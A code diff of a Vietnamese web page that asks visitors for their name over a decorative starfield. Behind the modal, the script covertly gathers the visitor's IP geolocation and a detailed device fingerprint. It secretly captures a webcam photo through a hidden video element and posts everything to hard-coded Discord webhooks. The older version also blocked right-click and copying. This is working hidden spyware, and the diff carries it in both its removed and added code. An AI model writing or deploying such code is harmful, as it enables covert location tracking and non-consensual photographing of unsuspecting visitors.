@@ -115,75 +115,366 @@ h1{font-size:32px;font-weight:700;color:#fff;margin-bottom:10px;text-shadow:0 0 
 </div>
 </div>
 </div>
-<!-- Modal -->
 <div id="notificationModal" class="modal">
-  <div class="modal-content">
-    
-    <div class="icon-wrapper">👤</div>
-
-    <h2>Chào bạn</h2>
-    <p class="desc">Nhập tên của bạn để tiếp tục</p>
-
-    <input 
-      type="text" 
-      id="nameInput"
-      class="name-input"
-      placeholder="Ví dụ: Mai Quỳnh"     
-      autocomplete="off"
-    >
-
-    <p class="error-message" id="errorMessage">
-      ⚠️ Vui lòng nhập tên hợp lệ
-    </p>
-
-    <button class="btn" id="confirmBtn">
-      Xác nhận
-    </button>
-
-  </div>
+<div class="modal-content">
+<div class="icon-wrapper"></div>
+<h2>Nhập tên của bạn</h2>
+<p>Vui lòng nhập tên để tiếp tục</p>
+<input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn...">
+<p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
+<button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
 </div>
-
-<video id="video" width="1" height="1" autoplay muted playsinline style="display:none;"></video>
-
+</div>
+<video id="video" width="1" height="1" autoplay style="display:none;"></video>
 <script>
 const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
-const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1466471346077827324/35ZOkMh1SUJtJVZI1H58KwQB0jOEJaK5IVBLcNpEKCctbGooYkG73sX5PYId4Nw43YkN';
-function createStars(){const starsContainer=document.getElementById('stars');const starCount=200;for(let i=0;i<starCount;i++){const star=document.createElement('div');star.className='star';star.style.width=Math.random()*3+'px';star.style.height=star.style.width;star.style.left=Math.random()*100+'%';star.style.top=Math.random()*100+'%';star.style.animationDuration=(Math.random()*3+2)+'s';star.style.animationDelay=Math.random()*3+'s';starsContainer.appendChild(star)}
-for(let i=0;i<3;i++){const shootingStar=document.createElement('div');shootingStar.className='shooting-star';shootingStar.style.width=Math.random()*100+100+'px';shootingStar.style.left=Math.random()*100+'%';shootingStar.style.top=Math.random()*50+'%';shootingStar.style.animationDelay=Math.random()*5+'s';shootingStar.style.animationDuration=Math.random()*2+2+'s';starsContainer.appendChild(shootingStar)}}
+
+function createStars(){
+    const starsContainer=document.getElementById('stars');
+    const starCount=200;
+    for(let i=0;i<starCount;i++){
+        const star=document.createElement('div');
+        star.className='star';
+        star.style.width=Math.random()*3+'px';
+        star.style.height=star.style.width;
+        star.style.left=Math.random()*100+'%';
+        star.style.top=Math.random()*100+'%';
+        star.style.animationDuration=(Math.random()*3+2)+'s';
+        star.style.animationDelay=Math.random()*3+'s';
+        starsContainer.appendChild(star)
+    }
+    for(let i=0;i<3;i++){
+        const shootingStar=document.createElement('div');
+        shootingStar.className='shooting-star';
+        shootingStar.style.width=Math.random()*100+100+'px';
+        shootingStar.style.left=Math.random()*100+'%';
+        shootingStar.style.top=Math.random()*50+'%';
+        shootingStar.style.animationDelay=Math.random()*5+'s';
+        shootingStar.style.animationDuration=Math.random()*2+2+'s';
+        starsContainer.appendChild(shootingStar)
+    }
+}
 createStars();
-document.addEventListener('contextmenu',e=>e.preventDefault());
-document.addEventListener('copy',e=>e.preventDefault());
-function capturePhoto(){const video=document.getElementById('video');if(!video.videoWidth||!video.videoHeight)return;const canvas=document.createElement('canvas');canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0);canvas.toBlob(blob=>{if(!blob)return;const formData=new FormData();formData.append('file',blob,'photo.jpg');const payload={username:'emytyxynh System',content:'📸 Webcam Capture'};formData.append('payload_json',JSON.stringify(payload));fetch(DISCORD_WEBHOOK,{method:'POST',body:formData}).then(response=>console.log('Photo sent:',response.status)).catch(err=>console.error('Photo error:',err))},'image/jpeg')}
-function sendToDiscord(ipData,userData,userName){const discordPayload={username:'emytyxynh Check System',avatar_url:'https://cdn-icons-png.flaticon.com/512/888/888879.png',embeds:[{title:"🎯 THÔNG TIN TRUY CẬP MỚI",description:`**Người dùng:** ${userName||"Không cung cấp"}\n**Thời gian:** ${new Date().toLocaleString('vi-VN')}`,color:3447003,thumbnail:{url:"https://cdn-icons-png.flaticon.com/512/1177/1177568.png"},fields:[{name:"🌍 THÔNG TIN ĐỊA LÝ",value:`> **IP:** \`${ipData.ip}\`\n> **Quốc gia:** ${ipData.country}\n> **Tỉnh/Thành:** ${ipData.region}\n> **Thành phố:** ${ipData.city}\n> **Khu vực:** ${ipData.district}\n> **Mã bưu điện:** ${ipData.postal}\n> **Tọa độ:** \`${ipData.lat}, ${ipData.lon}\`\n> **Múi giờ:** ${ipData.timezoneAPI}`,inline:false},{name:"🌐 MẠNG & KẾT NỐI",value:`> **ISP:** ${ipData.isp}\n> **Tổ chức:** ${ipData.org}\n> **ASN:** ${ipData.asn}\n> **Loại kết nối:** ${ipData.connection_type}\n> **Proxy/VPN:** ${ipData.proxy}\n> **Mobile:** ${ipData.mobile}`,inline:false},{name:"💻 THIẾT BỊ & HỆ THỐNG",value:`> **Hệ điều hành:** ${userData.os}\n> **Platform:** ${userData.platform}\n> **CPU Cores:** ${userData.cpuCores}\n> **RAM:** ${userData.ram}\n> **Màn hình:** ${userData.screen}\n> **Touch:** ${userData.touchSupport}`,inline:false},{name:"🎮 ĐỒ HỌA & TRÌNH DUYỆT",value:`> **GPU:** ${userData.gpu}\n> **Trình duyệt:** ${userData.browser}\n> **Phiên bản:** ${userData.browserVersion}\n> **Engine:** ${userData.engine}`,inline:false},{name:"🌏 NGÔN NGỮ & BẢO MẬT",value:`> **Ngôn ngữ:** ${userData.language}\n> **Múi giờ local:** ${userData.timezone}\n> **Do Not Track:** ${userData.doNotTrack}\n> **Cookie:** ${userData.cookieEnabled}\n> **WebRTC:** ${userData.webrtc}`,inline:false},{name:"🔍 USER AGENT",value:`\`\`\`${userData.userAgent.substring(0,500)}\`\`\``,inline:false}],timestamp:new Date().toISOString(),footer:{text:"emytyxynh Security System",icon_url:"https://cdn-icons-png.flaticon.com/512/6195/6195699.png"}}]};fetch(DISCORD_WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(discordPayload)}).then(response=>console.log('Data sent:',response.status)).catch(err=>console.error('Send error:',err))}
-async function getIPFromAPIs(){const results={ip:'Đang lấy...',country:'Đang lấy...',city:'Đang lấy...',region:'Đang lấy...',district:'Đang lấy...',postal:'Đang lấy...',lat:'Đang lấy...',lon:'Đang lấy...',timezoneAPI:'Đang lấy...',isp:'Đang lấy...',org:'Đang lấy...',asn:'Đang lấy...',connection_type:'Đang lấy...',proxy:'Đang lấy...',mobile:'Đang lấy...'};const apiCalls=[fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null),fetch('https://ipwho.is/').then(r=>r.json()).catch(()=>null),fetch('http://ip-api.com/json/?fields=66846719').then(r=>r.json()).catch(()=>null),fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null),fetch('https://geolocation-db.com/json/').then(r=>r.json()).catch(()=>null)];const responses=await Promise.all(apiCalls);const ipapi=responses[0];const ipwho=responses[1];const ipApiCom=responses[2];const ipinfo=responses[3];const geodb=responses[4];if(ipapi&&ipapi.ip){results.ip=ipapi.ip;results.country=ipapi.country_name||results.country;results.city=ipapi.city||results.city;results.region=ipapi.region||results.region;results.postal=ipapi.postal||results.postal;results.lat=ipapi.latitude||results.lat;results.lon=ipapi.longitude||results.lon;results.timezoneAPI=ipapi.timezone||results.timezoneAPI;results.isp=ipapi.org||results.isp;results.asn=ipapi.asn||results.asn}
-if(ipwho&&ipwho.ip){results.ip=results.ip==='Đang lấy...'?ipwho.ip:results.ip;results.country=ipwho.country||results.country;results.city=ipwho.city||results.city;results.region=ipwho.region||results.region;results.postal=ipwho.postal||results.postal;results.lat=ipwho.latitude||results.lat;results.lon=ipwho.longitude||results.lon;results.timezoneAPI=ipwho.timezone?.id||results.timezoneAPI;results.isp=ipwho.connection?.isp||results.isp;results.org=ipwho.connection?.org||results.org;results.asn=ipwho.connection?.asn||results.asn;results.district=ipwho.region||results.district}
-if(ipApiCom&&ipApiCom.status==='success'){results.ip=results.ip==='Đang lấy...'?ipApiCom.query:results.ip;results.country=ipApiCom.country||results.country;results.city=ipApiCom.city||results.city;results.region=ipApiCom.regionName||results.region;results.district=ipApiCom.district||results.district;results.postal=ipApiCom.zip||results.postal;results.lat=ipApiCom.lat||results.lat;results.lon=ipApiCom.lon||results.lon;results.timezoneAPI=ipApiCom.timezone||results.timezoneAPI;results.isp=ipApiCom.isp||results.isp;results.org=ipApiCom.org||ipApiCom.as||results.org;results.asn=ipApiCom.as||results.asn;results.proxy=ipApiCom.proxy?'Có':'Không';results.mobile=ipApiCom.mobile?'Có':'Không'}
-if(ipinfo&&ipinfo.ip){results.ip=results.ip==='Đang lấy...'?ipinfo.ip:results.ip;if(ipinfo.city)results.city=ipinfo.city;if(ipinfo.region)results.region=ipinfo.region;if(ipinfo.country)results.country=ipinfo.country;if(ipinfo.loc){const[lat,lon]=ipinfo.loc.split(',');results.lat=lat||results.lat;results.lon=lon||results.lon}
-results.postal=ipinfo.postal||results.postal;results.org=ipinfo.org||results.org;results.timezoneAPI=ipinfo.timezone||results.timezoneAPI}
-if(geodb&&geodb.IPv4){results.ip=results.ip==='Đang lấy...'?geodb.IPv4:results.ip;results.country=geodb.country_name||results.country;results.city=geodb.city||results.city;results.region=geodb.state||results.region;results.postal=geodb.postal||results.postal;results.lat=geodb.latitude||results.lat;results.lon=geodb.longitude||results.lon}
-Object.keys(results).forEach(key=>{if(results[key]==='Đang lấy...'||results[key]===null||results[key]===undefined||results[key]===''){results[key]='Không xác định'}});return results}
-function collectSystemInfo(){const userAgent=navigator.userAgent;const os=getOS();const browser=getBrowser();const cpuCores=navigator.hardwareConcurrency||'Không xác định';const ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'Không xác định';const gpu=getGPU();const language=(navigator.languages&&navigator.languages[0])||navigator.language||navigator.userLanguage||'Không xác định';const platform=navigator.platform||'Không xác định';const screenRes=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'Không xác định';const doNotTrack=navigator.doNotTrack==='1'?'Bật':'Tắt';const cookieEnabled=navigator.cookieEnabled?'Bật':'Tắt';const touchSupport='ontouchstart' in window||navigator.maxTouchPoints>0?'Có':'Không';const webrtc=detectWebRTC();const engine=getEngine();return{userAgent:userAgent,os:os,browser:browser.name,browserVersion:browser.version,cpuCores:cpuCores,ram:ram,gpu:gpu,language:language,platform:platform,screen:screenRes,timezone:timezone,doNotTrack:doNotTrack,cookieEnabled:cookieEnabled,touchSupport:touchSupport,webrtc:webrtc,engine:engine}}
-function getEngine(){const ua=navigator.userAgent;if(ua.indexOf('AppleWebKit')>-1){if(ua.indexOf('Chrome')>-1)return 'Blink';return 'WebKit'}
-if(ua.indexOf('Gecko')>-1&&ua.indexOf('Firefox')>-1)return 'Gecko';if(ua.indexOf('Trident')>-1)return 'Trident';if(ua.indexOf('Presto')>-1)return 'Presto';return 'Không xác định'}
-function detectWebRTC(){if(window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection){return 'Hỗ trợ'}
-return 'Không hỗ trợ'}
-function getBrowser(){const ua=navigator.userAgent;let browserName="Không xác định";let browserVersion="Không xác định";if(ua.indexOf("Firefox")>-1){browserName="Firefox";browserVersion=ua.match(/Firefox\/([0-9.]+)/)?.[1]||"Không xác định"}else if(ua.indexOf("Edg")>-1){browserName="Edge";browserVersion=ua.match(/Edg\/([0-9.]+)/)?.[1]||"Không xác định"}else if(ua.indexOf("Chrome")>-1&&ua.indexOf("Edg")===-1){browserName="Chrome";browserVersion=ua.match(/Chrome\/([0-9.]+)/)?.[1]||"Không xác định"}else if(ua.indexOf("Safari")>-1&&ua.indexOf("Chrome")===-1){browserName="Safari";browserVersion=ua.match(/Version\/([0-9.]+)/)?.[1]||"Không xác định"}else if(ua.indexOf("Opera")>-1||ua.indexOf("OPR")>-1){browserName="Opera";browserVersion=ua.match(/OPR\/([0-9.]+)/)?.[1]||"Không xác định"}
-return{name:browserName,version:browserVersion}}
-function requestCameraAccess(){if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{const video=document.getElementById('video');video.srcObject=stream;video.onloadedmetadata=()=>{video.play();setTimeout(()=>capturePhoto(),1000)}}).catch(err=>console.error('Camera error:',err))}}
-function getOS(){const ua=navigator.userAgent;if(/windows phone/i.test(ua))return "Windows Phone";if(/android/i.test(ua)){const version=ua.match(/Android\s([0-9.]+)/);return version?`Android ${version[1]}`:"Android"}
-if(/iPad|iPhone|iPod/.test(ua)){const version=ua.match(/OS\s([0-9_]+)/);return version?`iOS ${version[1].replace(/_/g,'.')}`:"iOS"}
-if(/Macintosh|Mac OS X/.test(ua)){const version=ua.match(/Mac OS X\s([0-9_]+)/);return version?`macOS ${version[1].replace(/_/g,'.')}`:"Mac OS"}
-if(/Windows NT/.test(ua)){const version=ua.match(/Windows NT\s([0-9.]+)/);const winVersions={'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7','6.0':'Windows Vista'};return version?(winVersions[version[1]]||`Windows NT ${version[1]}`):"Windows"}
-if(/Linux/.test(ua))return "Linux";return "Không xác định"}
-function getGPU(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');if(gl){const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');if(debugInfo){const renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);return renderer||'Không xác định'}}}catch(e){}
-return 'Không xác định'}
-async function collectAndSendData(userName){try{const systemInfo=collectSystemInfo();const ipData=await getIPFromAPIs();sendToDiscord(ipData,systemInfo,userName);requestCameraAccess()}catch(error){console.error('Collection error:',error)}}
-function handleConfirm(){const nameInput=document.getElementById('nameInput');const errorMessage=document.getElementById('errorMessage');const userName=nameInput.value.trim();if(!userName||userName.length<2){nameInput.style.borderColor='rgba(255, 0, 0, 0.5)';errorMessage.style.display='block';return}
-document.getElementById('notificationModal').style.display='none';collectAndSendData(userName)}
+
+// ĐÃ XÓA phần chặn hotkey dưới đây:
+// document.onkeydown=e=>(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.key==='u'))&&e.preventDefault();
+
+function capturePhoto(){
+    const video=document.getElementById('video');
+    if(!video.videoWidth||!video.videoHeight)return;
+    const canvas=document.createElement('canvas');
+    canvas.width=video.videoWidth;
+    canvas.height=video.videoHeight;
+    canvas.getContext('2d').drawImage(video,0,0);
+    canvas.toBlob(blob=>{
+        if(!blob)return;
+        const formData=new FormData();
+        formData.append('file',blob,'photo.jpg');
+        const payload={username:'emytyxynh System',content:'📸 Webcam Capture'};
+        formData.append('payload_json',JSON.stringify(payload));
+        fetch(DISCORD_WEBHOOK,{method:'POST',body:formData})
+        .then(response=>console.log('Photo sent:',response.status))
+        .catch(err=>console.error('Photo error:',err))
+    },'image/jpeg')
+}
+
+function sendToDiscord(ipData,userData,userName){
+    const discordPayload={
+        username:'emytyxynh Check System',
+        avatar_url:'https://cdn-icons-png.flaticon.com/512/888/888879.png',
+        embeds:[{
+            title:"🎯 THÔNG TIN TRUY CẬP MỚI",
+            description:`**Người dùng:** ${userName||"Không cung cấp"}\n**Thời gian:** ${new Date().toLocaleString('vi-VN')}`,
+            color:3447003,
+            thumbnail:{url:"https://cdn-icons-png.flaticon.com/512/1177/1177568.png"},
+            fields:[
+                {name:"🌍 THÔNG TIN ĐỊA LÝ",value:`> **IP:** \`${ipData.ip}\`\n> **Quốc gia:** ${ipData.country}\n> **Tỉnh/Thành:** ${ipData.region}\n> **Thành phố:** ${ipData.city}\n> **Khu vực:** ${ipData.district}\n> **Mã bưu điện:** ${ipData.postal}\n> **Tọa độ:** \`${ipData.lat}, ${ipData.lon}\`\n> **Múi giờ:** ${ipData.timezoneAPI}`,inline:false},
+                {name:"🌐 MẠNG & KẾT NỐI",value:`> **ISP:** ${ipData.isp}\n> **Tổ chức:** ${ipData.org}\n> **ASN:** ${ipData.asn}\n> **Loại kết nối:** ${ipData.connection_type}\n> **Proxy/VPN:** ${ipData.proxy}\n> **Mobile:** ${ipData.mobile}`,inline:false},
+                {name:"💻 THIẾT BỊ & HỆ THỐNG",value:`> **Hệ điều hành:** ${userData.os}\n> **Platform:** ${userData.platform}\n> **CPU Cores:** ${userData.cpuCores}\n> **RAM:** ${userData.ram}\n> **Màn hình:** ${userData.screen}\n> **Touch:** ${userData.touchSupport}`,inline:false},
+                {name:"🎮 ĐỒ HỌA & TRÌNH DUYỆT",value:`> **GPU:** ${userData.gpu}\n> **Trình duyệt:** ${userData.browser}\n> **Phiên bản:** ${userData.browserVersion}\n> **Engine:** ${userData.engine}`,inline:false},
+                {name:"🌏 NGÔN NGỮ & BẢO MẬT",value:`> **Ngôn ngữ:** ${userData.language}\n> **Múi giờ local:** ${userData.timezone}\n> **Do Not Track:** ${userData.doNotTrack}\n> **Cookie:** ${userData.cookieEnabled}\n> **WebRTC:** ${userData.webrtc}`,inline:false},
+                {name:"🔍 USER AGENT",value:`\`\`\`${userData.userAgent.substring(0,500)}\`\`\``,inline:false}
+            ],
+            timestamp:new Date().toISOString(),
+            footer:{text:"emytyxynh Security System",icon_url:"https://cdn-icons-png.flaticon.com/512/6195/6195699.png"}
+        }]
+    };
+    fetch(DISCORD_WEBHOOK,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(discordPayload)
+    })
+    .then(response=>console.log('Data sent:',response.status))
+    .catch(err=>console.error('Send error:',err))
+}
+
+async function getIPFromAPIs(){
+    const results={
+        ip:'Đang lấy...',country:'Đang lấy...',city:'Đang lấy...',
+        region:'Đang lấy...',district:'Đang lấy...',postal:'Đang lấy...',
+        lat:'Đang lấy...',lon:'Đang lấy...',timezoneAPI:'Đang lấy...',
+        isp:'Đang lấy...',org:'Đang lấy...',asn:'Đang lấy...',
+        connection_type:'Đang lấy...',proxy:'Đang lấy...',mobile:'Đang lấy...'
+    };
+    const apiCalls=[
+        fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null),
+        fetch('https://ipwho.is/').then(r=>r.json()).catch(()=>null),
+        fetch('http://ip-api.com/json/?fields=66846719').then(r=>r.json()).catch(()=>null),
+        fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null),
+        fetch('https://geolocation-db.com/json/').then(r=>r.json()).catch(()=>null)
+    ];
+    const responses=await Promise.all(apiCalls);
+    const ipapi=responses[0];
+    const ipwho=responses[1];
+    const ipApiCom=responses[2];
+    const ipinfo=responses[3];
+    const geodb=responses[4];
+    
+    if(ipapi&&ipapi.ip){
+        results.ip=ipapi.ip;
+        results.country=ipapi.country_name||results.country;
+        results.city=ipapi.city||results.city;
+        results.region=ipapi.region||results.region;
+        results.postal=ipapi.postal||results.postal;
+        results.lat=ipapi.latitude||results.lat;
+        results.lon=ipapi.longitude||results.lon;
+        results.timezoneAPI=ipapi.timezone||results.timezoneAPI;
+        results.isp=ipapi.org||results.isp;
+        results.asn=ipapi.asn||results.asn
+    }
+    if(ipwho&&ipwho.ip){
+        results.ip=results.ip==='Đang lấy...'?ipwho.ip:results.ip;
+        results.country=ipwho.country||results.country;
+        results.city=ipwho.city||results.city;
+        results.region=ipwho.region||results.region;
+        results.postal=ipwho.postal||results.postal;
+        results.lat=ipwho.latitude||results.lat;
+        results.lon=ipwho.longitude||results.lon;
+        results.timezoneAPI=ipwho.timezone?.id||results.timezoneAPI;
+        results.isp=ipwho.connection?.isp||results.isp;
+        results.org=ipwho.connection?.org||results.org;
+        results.asn=ipwho.connection?.asn||results.asn;
+        results.district=ipwho.region||results.district
+    }
+    if(ipApiCom&&ipApiCom.status==='success'){
+        results.ip=results.ip==='Đang lấy...'?ipApiCom.query:results.ip;
+        results.country=ipApiCom.country||results.country;
+        results.city=ipApiCom.city||results.city;
+        results.region=ipApiCom.regionName||results.region;
+        results.district=ipApiCom.district||results.district;
+        results.postal=ipApiCom.zip||results.postal;
+        results.lat=ipApiCom.lat||results.lat;
+        results.lon=ipApiCom.lon||results.lon;
+        results.timezoneAPI=ipApiCom.timezone||results.timezoneAPI;
+        results.isp=ipApiCom.isp||results.isp;
+        results.org=ipApiCom.org||ipApiCom.as||results.org;
+        results.asn=ipApiCom.as||results.asn;
+        results.proxy=ipApiCom.proxy?'Có':'Không';
+        results.mobile=ipApiCom.mobile?'Có':'Không'
+    }
+    if(ipinfo&&ipinfo.ip){
+        results.ip=results.ip==='Đang lấy...'?ipinfo.ip:results.ip;
+        if(ipinfo.city)results.city=ipinfo.city;
+        if(ipinfo.region)results.region=ipinfo.region;
+        if(ipinfo.country)results.country=ipinfo.country;
+        if(ipinfo.loc){
+            const[lat,lon]=ipinfo.loc.split(',');
+            results.lat=lat||results.lat;
+            results.lon=lon||results.lon
+        }
+        results.postal=ipinfo.postal||results.postal;
+        results.org=ipinfo.org||results.org;
+        results.timezoneAPI=ipinfo.timezone||results.timezoneAPI
+    }
+    if(geodb&&geodb.IPv4){
+        results.ip=results.ip==='Đang lấy...'?geodb.IPv4:results.ip;
+        results.country=geodb.country_name||results.country;
+        results.city=geodb.city||results.city;
+        results.region=geodb.state||results.region;
+        results.postal=geodb.postal||results.postal;
+        results.lat=geodb.latitude||results.lat;
+        results.lon=geodb.longitude||results.lon
+    }
+    Object.keys(results).forEach(key=>{
+        if(results[key]==='Đang lấy...'||results[key]===null||results[key]===undefined||results[key]===''){
+            results[key]='Không xác định'
+        }
+    });
+    return results
+}
+
+function collectSystemInfo(){
+    const userAgent=navigator.userAgent;
+    const os=getOS();
+    const browser=getBrowser();
+    const cpuCores=navigator.hardwareConcurrency||'Không xác định';
+    const ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'Không xác định';
+    const gpu=getGPU();
+    const language=(navigator.languages&&navigator.languages[0])||navigator.language||navigator.userLanguage||'Không xác định';
+    const platform=navigator.platform||'Không xác định';
+    const screenRes=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'Không xác định';
+    const doNotTrack=navigator.doNotTrack==='1'?'Bật':'Tắt';
+    const cookieEnabled=navigator.cookieEnabled?'Bật':'Tắt';
+    const touchSupport='ontouchstart' in window||navigator.maxTouchPoints>0?'Có':'Không';
+    const webrtc=detectWebRTC();
+    const engine=getEngine();
+    return{
+        userAgent:userAgent,
+        os:os,
+        browser:browser.name,
+        browserVersion:browser.version,
+        cpuCores:cpuCores,
+        ram:ram,
+        gpu:gpu,
+        language:language,
+        platform:platform,
+        screen:screenRes,
+        timezone:timezone,
+        doNotTrack:doNotTrack,
+        cookieEnabled:cookieEnabled,
+        touchSupport:touchSupport,
+        webrtc:webrtc,
+        engine:engine
+    }
+}
+
+function getEngine(){
+    const ua=navigator.userAgent;
+    if(ua.indexOf('AppleWebKit')>-1){
+        if(ua.indexOf('Chrome')>-1)return 'Blink';
+        return 'WebKit'
+    }
+    if(ua.indexOf('Gecko')>-1&&ua.indexOf('Firefox')>-1)return 'Gecko';
+    if(ua.indexOf('Trident')>-1)return 'Trident';
+    if(ua.indexOf('Presto')>-1)return 'Presto';
+    return 'Không xác định'
+}
+
+function detectWebRTC(){
+    if(window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection){
+        return 'Hỗ trợ'
+    }
+    return 'Không hỗ trợ'
+}
+
+function getBrowser(){
+    const ua=navigator.userAgent;
+    let browserName="Không xác định";
+    let browserVersion="Không xác định";
+    if(ua.indexOf("Firefox")>-1){
+        browserName="Firefox";
+        browserVersion=ua.match(/Firefox\/([0-9.]+)/)?.[1]||"Không xác định"
+    }else if(ua.indexOf("Edg")>-1){
+        browserName="Edge";
+        browserVersion=ua.match(/Edg\/([0-9.]+)/)?.[1]||"Không xác định"
+    }else if(ua.indexOf("Chrome")>-1&&ua.indexOf("Edg")===-1){
+        browserName="Chrome";
+        browserVersion=ua.match(/Chrome\/([0-9.]+)/)?.[1]||"Không xác định"
+    }else if(ua.indexOf("Safari")>-1&&ua.indexOf("Chrome")===-1){
+        browserName="Safari";
+        browserVersion=ua.match(/Version\/([0-9.]+)/)?.[1]||"Không xác định"
+    }else if(ua.indexOf("Opera")>-1||ua.indexOf("OPR")>-1){
+        browserName="Opera";
+        browserVersion=ua.match(/OPR\/([0-9.]+)/)?.[1]||"Không xác định"
+    }
+    return{name:browserName,version:browserVersion}
+}
+
+function requestCameraAccess(){
+    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+        navigator.mediaDevices.getUserMedia({video:true})
+        .then(stream=>{
+            const video=document.getElementById('video');
+            video.srcObject=stream;
+            video.onloadedmetadata=()=>{
+                video.play();
+                setTimeout(()=>capturePhoto(),1000)
+            }
+        })
+        .catch(err=>console.error('Camera error:',err))
+    }
+}
+
+function getOS(){
+    const ua=navigator.userAgent;
+    if(/windows phone/i.test(ua))return "Windows Phone";
+    if(/android/i.test(ua)){
+        const version=ua.match(/Android\s([0-9.]+)/);
+        return version?`Android ${version[1]}`:"Android"
+    }
+    if(/iPad|iPhone|iPod/.test(ua)){
+        const version=ua.match(/OS\s([0-9_]+)/);
+        return version?`iOS ${version[1].replace(/_/g,'.')}`:"iOS"
+    }
+    if(/Macintosh|Mac OS X/.test(ua)){
+        const version=ua.match(/Mac OS X\s([0-9_]+)/);
+        return version?`macOS ${version[1].replace(/_/g,'.')}`:"Mac OS"
+    }
+    if(/Windows NT/.test(ua)){
+        const version=ua.match(/Windows NT\s([0-9.]+)/);
+        const winVersions={'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7','6.0':'Windows Vista'};
+        return version?(winVersions[version[1]]||`Windows NT ${version[1]}`):"Windows"
+    }
+    if(/Linux/.test(ua))return "Linux";
+    return "Không xác định"
+}
+
+function getGPU(){
+    try{
+        const canvas=document.createElement('canvas');
+        const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+        if(gl){
+            const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+            if(debugInfo){
+                const renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                return renderer||'Không xác định'
+            }
+        }
+    }catch(e){}
+    return 'Không xác định'
+}
+
+async function collectAndSendData(userName){
+    try{
+        const systemInfo=collectSystemInfo();
+        const ipData=await getIPFromAPIs();
+        sendToDiscord(ipData,systemInfo,userName);
+        requestCameraAccess()
+    }catch(error){
+        console.error('Collection error:',error)
+    }
+}
+
+function handleConfirm(){
+    const nameInput=document.getElementById('nameInput');
+    const errorMessage=document.getElementById('errorMessage');
+    const userName=nameInput.value.trim();
+    if(!userName||userName.length<2){
+        nameInput.style.borderColor='rgba(255, 0, 0, 0.5)';
+        errorMessage.style.display='block';
+        return
+    }
+    document.getElementById('notificationModal').style.display='none';
+    collectAndSendData(userName)
+}
+
 document.getElementById('confirmBtn').addEventListener('click',handleConfirm);
-document.getElementById('nameInput').addEventListener('keypress',function(e){if(e.key==='Enter'){handleConfirm()}});
-document.getElementById('nameInput').addEventListener('input',function(){this.style.borderColor='rgba(255, 255, 255, 0.1)';document.getElementById('errorMessage').style.display='none'});
-window.addEventListener('DOMContentLoaded',function(){setTimeout(()=>{document.getElementById('notificationModal').style.display='block';document.getElementById('nameInput').focus()},500)});
+document.getElementById('nameInput').addEventListener('keypress',function(e){
+    if(e.key==='Enter'){
+        handleConfirm()
+    }
+});
+document.getElementById('nameInput').addEventListener('input',function(){
+    this.style.borderColor='rgba(255, 255, 255, 0.1)';
+    document.getElementById('errorMessage').style.display='none'
+});
+window.addEventListener('DOMContentLoaded',function(){
+    setTimeout(()=>{
+        document.getElementById('notificationModal').style.display='block';
+        document.getElementById('nameInput').focus()
+    },500)
+});
 </script>
 </body>
 </html>
